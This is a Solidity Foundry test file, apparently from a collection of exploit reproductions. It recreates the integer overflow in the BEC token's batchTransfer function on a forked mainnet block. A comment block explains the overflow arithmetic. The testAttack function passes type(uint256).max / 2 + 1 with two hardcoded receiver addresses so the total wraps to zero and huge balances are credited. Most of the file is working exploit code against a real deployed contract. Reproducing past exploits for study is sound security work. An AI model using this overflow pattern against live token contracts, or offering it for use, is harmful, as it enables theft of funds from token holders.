// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// BEC contract - 0xC5d105E63711398aF9bbff092d4B6769C82F793D
// mainnet block - 5483643
/* 
function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender].sub(amount);
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]].add(_value);
        Transfer(msg.sender, _receivers[i], _value);
    }
    return true;
} 

in contracts line 261 ---> here line 11
if we put 3 receivers and divide the largest possible uint256 number into 3 parts

when the check hit the line 13


cnt = 3
amount = 3 * type(uint256).max /3

and check will fail

but if we add 1 now the amount rolls over to 0 and the check passes

largest number will be 2^256 hence a multiple of 2 ===> type(uint256).max / 2 will be an integer

cnt = 2
amount = 2 * type(uint256).max / 2 + 1     =>>> amount = 0
check on line 12 passes
check on line 13 passes

*/

interface IBEC {
    // to execute exploit
    function batchTransfer(address[] calldata _receivers, uint256 _value)
        external
        returns (bool);

    // check balances
    function balanceOf(address _owner) external returns (uint256 balance);
}

contract BECIntergerOverflow is Test {
    IBEC BECContract = IBEC(0xC5d105E63711398aF9bbff092d4B6769C82F793D);

    address attack1 = 0xC47E6da611DC4e8476445e0E2B56Baa97A4b12B9;
    address attack2 = 0x3399FFB4ff1010b92357a22D329F724f45590fa5;

    function setUp() public {
        vm.createSelectFork("mainnet", 5483642);
    }

    function testBalance() external {
        // event log_named_decimal_<type>(string key, <type> val, uint decimals);
        emit log_named_decimal_uint(
            "Before attack",
            BECContract.balanceOf(attack1),
            18
        );
    }

    function testAttack() external {
        address[] memory receivers = new address[](2);
        receivers[0] = attack1;
        receivers[1] = attack2;

        BECContract.batchTransfer(receivers, type(uint256).max / 2 + 1);

        emit log_named_decimal_uint(
            "After attack",
            BECContract.balanceOf(attack1),
            18
        );

        emit log_named_decimal_uint(
            "After attack",
            BECContract.balanceOf(attack2),
            18
        );
    }
}
